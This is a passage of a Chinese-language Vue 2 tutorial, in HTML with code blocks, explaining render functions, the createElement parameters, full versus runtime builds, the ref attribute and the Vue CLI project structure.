myParagraphVNode</span><br><span class="line">    ])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你真的需要重复很多次的元素/组件，你可以使用工厂函数来实现。例如，下面这个例子 <code>render</code> 函数完美有效地渲染了 <code>20</code> 个重复的段落：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">render: <span class="function"><span class="keyword">function</span> (<span class="params">createElement</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> createElement(<span class="string">&#x27;div&#x27;</span>,</span><br><span class="line">        <span class="built_in">Array</span>.apply(<span class="literal">null</span>, &#123; <span class="attr">length</span>: <span class="number">20</span> &#125;).map(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> createElement(<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;hi&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="vue渲染机制"><a href="#vue渲染机制" class="headerlink" title="vue渲染机制"></a>vue渲染机制</h3><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202151656604.webp" alt="13429147-b34d3ed28b6eccb6"></p><p>这里会涉及到Vue的另外两个概念：</p><ul><li><strong>独立构建</strong>：包含模板编译器，渲染过程<code>HTML字符串 → render函数 → VNode → 真实DOM节点</code></li><li><strong>运行时构建</strong>：不包含模板编译器，渲染过程<code>render函数 → VNode → 真实DOM节点</code></li></ul><p>运行时构建的包，会比独立构建少一个模板编译器。在<code>$mount</code>函数上也不同。而<code>$mount</code>方法又是整个渲染过程的起始点。用一张流程图来说明：</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202151657865.webp" alt="13429147-7f193c6cb2e36da0"></p><p>由此图可以看到，在渲染过程中，提供了三种渲染模式，自定义<code>render</code>函数、<code>template</code>、<code>el</code>均可以渲染页面，也就是对应我们使用Vue时，三种写法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(<span class="string">&#x27;anchored-heading&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">render</span>: <span class="function"><span class="keyword">function</span> (<span class="params">createElement</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> createElement (</span><br><span class="line">            <span class="string">&#x27;h&#x27;</span> + <span class="built_in">this</span>.level,   <span class="comment">// tag name标签名称</span></span><br><span class="line">            <span class="built_in">this</span>.$slots.default <span class="comment">// 子组件中的阵列</span></span><br><span class="line">        )</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">props</span>: &#123;</span><br><span class="line">        <span class="attr">level</span>: &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="built_in">Number</span>,</span><br><span class="line">            <span class="attr">required</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="string">`&lt;div&gt;&#123;&#123; msg &#125;&#125;&lt;/div&gt;`</span>,</span><br><span class="line">    data () &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    data () &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&#x27;Hello Vue!&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这三种渲染模式最终都是要得到<code>render</code>函数。只不过用户自定义的<code>render</code>函数省去了程序分析的过程，等同于处理过的<code>render</code>函数，而普通的<code>template</code>或者<code>el</code>只是字符串，需要解析成AST，再将AST转化为<code>render</code>函数。</p><h3 id="理解createElement"><a href="#理解createElement" class="headerlink" title="理解createElement"></a>理解createElement</h3><p>使用<code>render</code>函数，其中还有另一个需要掌握的部分，那就是<code>createElement</code>。接下来我们需要熟悉的是如何在<code>createElement</code>函数中生成模板。那么我们分两个部分来对<code>createElement</code>进行理解。</p><h4 id="createElement参数"><a href="#createElement参数" class="headerlink" title="createElement参数"></a><code>createElement</code>参数</h4><p><code>createElement</code>可以是接受多个参数：</p><h5 id="第一个参数：-String-Object-Function"><a href="#第一个参数：-String-Object-Function" class="headerlink" title="第一个参数：{String | Object | Function}"></a>第一个参数：<code>&#123;String | Object | Function&#125;</code></h5><p>第一个参数对于<code>createElement</code>而言是一个必须的参数，这个参数可以是字符串<code>string</code>、是一个对象<code>object</code>，也可以是一个函数<code>function</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">custom-element</span>&gt;</span><span class="tag">&lt;/<span class="name">custom-element</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">Vue.component(<span class="string">&#x27;custom-element&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">render</span>: <span class="function"><span class="keyword">function</span> (<span class="params">createElement</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> createElement(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>上面的示例，给<code>createElement</code>传了一个<code>String</code>参数<code>&#39;div&#39;</code>，即传了一个HTML标签字符。最后会有一个<code>div</code>元素渲染出来：</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202151659674.webp" alt="13429147-eb35f142664bda0c"></p></li></ul><p>接着把上例中的<code>String</code>换成一个<code>Object</code>，比如：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(<span class="string">&#x27;custom-element&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">render</span>: <span class="function"><span class="keyword">function</span> (<span class="params">createElement</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> createElement(&#123;</span><br><span class="line">            <span class="attr">template</span>: <span class="string">`&lt;div&gt;Hello Vue!&lt;/div&gt;`</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>上例传了一个<code>&#123;template: &#39;&lt;div&gt;Hello Vue!&lt;/div&gt;&#39;&#125;</code>对象。此时<code>custom-element</code>组件渲染出来的结果如下：</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202151700234.webp" alt="13429147-cafcbeeddcfda7e4"></p><p>除此之外，还可以传一个<code>Function</code>，比如：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(<span class="string">&#x27;custom-element&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">render</span>: <span class="function"><span class="keyword">function</span> (<span class="params">createElement</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> eleFun = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">template</span>: <span class="string">`&lt;div&gt;Hello Vue!&lt;/div&gt;`</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> createElement(eleFun())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>最终得到的结果和上图是一样的。这里传了一个<code>eleFun()</code>函数给<code>createElement</code>，而这个函数返回的是一个对象。</p><h5 id="第二个参数-Object"><a href="#第二个参数-Object" class="headerlink" title="第二个参数:{Object}"></a>第二个参数:<code>&#123;Object&#125;</code></h5><p><code>createElement</code>是一个可选参数，这个参数是一个<code>Object</code>。来看一个小示例：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">custom-element</span>&gt;</span><span class="tag">&lt;/<span class="name">custom-element</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">Vue.component(<span class="string">&#x27;custom-element&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">render</span>: <span class="function"><span class="keyword">function</span> (<span class="params">createElement</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> self = <span class="built_in">this</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第一个参数是一个简单的HTML标签字符 “必选”</span></span><br><span class="line">        <span class="comment">// 第二个参数是一个包含模板相关属性的数据对象 “可选”</span></span><br><span class="line">        <span class="keyword">return</span> createElement(<span class="string">&#x27;div&#x27;</span>, &#123;</span><br><span class="line">            <span class="string">&#x27;class&#x27;</span>: &#123;</span><br><span class="line">                <span class="attr">foo</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">bar</span>: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">style</span>: &#123;</span><br><span class="line">                <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">                <span class="attr">fontSize</span>: <span class="string">&#x27;14px&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">attrs</span>: &#123;</span><br><span class="line">                <span class="attr">id</span>: <span class="string">&#x27;boo&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">domProps</span>: &#123;</span><br><span class="line">                <span class="attr">innerHTML</span>: <span class="string">&#x27;Hello Vue!&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>最终生成的DOM，将会带一些属性和内容的<code>div</code>元素，如下图所示：</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202151701145.webp" alt="13429147-bef18523b2d62e16"></p><h5 id="第三个参数：-String-Array"><a href="#第三个参数：-String-Array" class="headerlink" title="第三个参数：{String | Array}"></a>第三个参数：{String | Array}</h5><p><code>createElement</code>还有第三个参数，这个参数是可选的，可以给其传一个<code>String</code>或<code>Array</code>。比如下面这个小示例：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">custom-element</span>&gt;</span><span class="tag">&lt;/<span class="name">custom-element</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">Vue.component(<span class="string">&#x27;custom-element&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">render</span>: <span class="function"><span class="keyword">function</span> (<span class="params">createElement</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> self = <span class="built_in">this</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> createElement(</span><br><span class="line">            <span class="string">&#x27;div&#x27;</span>, <span class="comment">// 第一个参数是一个简单的HTML标签字符 “必选”</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">class</span>: &#123;</span><br><span class="line">                    <span class="attr">title</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">style</span>: &#123;</span><br><span class="line">                    <span class="attr">border</span>: <span class="string">&#x27;1px solid&#x27;</span>,</span><br><span class="line">                    <span class="attr">padding</span>: <span class="string">&#x27;10px&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="comment">// 第二个参数是一个包含模板相关属性的数据对象 “可选”</span></span><br><span class="line">            [</span><br><span class="line">                createElement(<span class="string">&#x27;h1&#x27;</span>, <span class="string">&#x27;Hello Vue!&#x27;</span>),</span><br><span class="line">                createElement(<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;开始学习Vue!&#x27;</span>)</span><br><span class="line">            ] <span class="comment">// 第三个参数是传了多个子元素的一个数组 “可选”</span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202151702513.webp" alt="13429147-1c69ce736a29a3c1"></p><p>如果箭头函数的函数体只有一句代码，就是简单返回某个变量或者返回一个简单的JS表达式，可以省去函数体的大括号{ }。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="params">val</span> =&gt;</span> val; <span class="comment">// 等同于 let f = function (val) &#123; return val &#125;;</span></span><br><span class="line"><span class="keyword">let</span> sum = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span> num1 + num2; <span class="comment">// 等同于 let sum = function(num1, num2) &#123; return num1 + num2; &#125;; </span></span><br></pre></td></tr></table></figure><p>main.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">该文件是整个项目的入口文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//引入Vue</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">//引入App组件，它是所有组件的父组件</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="comment">//关闭vue的生产提示</span></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">关于不同版本的Vue：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1.vue.js与vue.runtime.xxx.js的区别：</span></span><br><span class="line"><span class="comment">(1).vue.js是完整版的Vue，包含：核心功能+模板解析器。</span></span><br><span class="line"><span class="comment">(2).vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用</span></span><br><span class="line"><span class="comment">render函数接收到的createElement函数去指定具体内容。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建Vue实例对象---vm</span></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line"><span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line"><span class="comment">//render函数完成了这个功能：将App组件放入容器中</span></span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> h(App),</span><br><span class="line"><span class="comment">// render:q=&gt; q(&#x27;h1&#x27;,&#x27;你好啊&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// template:`&lt;h1&gt;你好啊&lt;/h1&gt;`,</span></span><br><span class="line"><span class="comment">// components:&#123;App&#125;,</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="ref属性"><a href="#ref属性" class="headerlink" title="ref属性"></a>ref属性</h3><p><strong>main.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引入Vue</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">//引入App</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="comment">//关闭Vue的生产提示</span></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建vm</span></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line"><span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line"><span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>App.vue</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-text</span>=<span class="string">&quot;msg&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">ref</span>=<span class="string">&quot;btn&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showDOM&quot;</span>&gt;</span>点我输出上方的DOM元素<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">School</span> <span class="attr">ref</span>=<span class="string">&quot;sch&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//引入School组件</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">import</span> School <span class="keyword">from</span> <span class="string">&#x27;./components/School&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;App&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">components</span>:&#123;School&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">msg</span>:<span class="string">&#x27;欢迎学习Vue！&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">showDOM</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="built_in">this</span>.$refs.title) <span class="comment">//真实DOM元素</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="built_in">this</span>.$refs.btn) <span class="comment">//真实DOM元素</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="built_in">this</span>.$refs.sch) <span class="comment">//School组件的实例对象（vc）</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>./components/School.vue</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;school&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;School&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">address</span>:<span class="string">&#x27;北京·昌平&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-class">.school</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">background-color</span>: gray;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><h2 id="脚手架文件结构"><a href="#脚手架文件结构" class="headerlink" title="脚手架文件结构"></a>脚手架文件结构</h2><pre><code>├── node_modules ├── public│   ├── favicon.ico: 页签图标│   └── index.html: 主页面├── src│   ├── assets: 存放静态资源│   │   └── logo.png│   │── component: 存放组件│   │   └── HelloWorld.vue│   │── App.vue: 汇总所有组件│   │── main.js: 入口文件├── .gitignore: git版本管制忽略的配置├── babel.config.js: babel的配置文件├── package.json: 应用包配置文件 ├── README.md: 应用描述文件├── package-lock.json：包版本控制文件</code></pre><h2 id="关于不同版本的Vue"><a href="#关于不同版本的Vue" class="headerlink" title="关于不同版本的Vue"></a>关于不同版本的Vue</h2><ol><li>vue.js与vue.runtime.xxx.js的区别：<ol><li>vue.js是完整版的Vue，包含：核心功能 + 模板解析器。</li><li>vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。</li></ol></li><li>因为vue.runtime.xxx.js没有模板解析器，所以不能使用template这个配置项，需要使用render函数接收到的createElement函数去指定具体内容。</li></ol><h2 id="vue-config-js配置文件"><a href="#vue-config-js配置文件" class="headerlink" title="vue.config.js配置文件"></a>vue.config.js配置文件</h2><ol><li>使用vue inspect &gt; output.js可以查看到Vue脚手架的默认配置。</li><li>使用vue.config.js可以对脚手架进行个性化定制，详情见：<a 